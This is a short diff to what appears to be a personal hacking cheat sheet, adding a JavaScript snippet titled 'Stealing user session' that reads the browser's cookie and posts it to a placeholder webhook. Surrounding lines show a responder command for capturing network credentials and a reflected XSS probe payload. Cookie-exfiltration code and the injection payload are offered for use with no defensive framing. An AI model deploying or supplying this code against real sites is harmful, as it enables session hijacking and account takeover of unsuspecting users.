@@ -34,6 +34,24 @@ responder –I wlan0
 # logs stored in /usr/share/responder/logs
 
 
+# Stealing user session
+let session = document.cookie.split("; ")[1];
+
+fetch(
+ "'WEBHOOK_LINK",
+  {
+    method: "post",
+    headers: {
+      "Content-Type": "application/json",
+    },
+    body: JSON.stringify({
+      username: 'scary 1337 haxor >:)',
+      content: "**`" + session + "`**"
+    })
+  }
+);
+
+
 
 
 Target[.]com/?s=”><script>alert(1)</script> -> No result
